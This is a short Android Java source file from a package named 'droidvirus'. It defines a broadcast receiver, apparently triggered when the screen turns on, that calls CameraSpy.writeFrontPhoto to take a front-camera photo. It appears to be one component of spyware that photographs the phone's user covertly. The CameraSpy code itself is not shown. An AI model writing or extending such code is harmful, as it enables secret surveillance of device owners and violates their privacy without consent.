package com.artisanter.droidvirus;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

class ScreenOnReceiver extends BroadcastReceiver{
    @Override
    public void onReceive(Context context, Intent intent){
        CameraSpy.writeFrontPhoto(context);
    }
}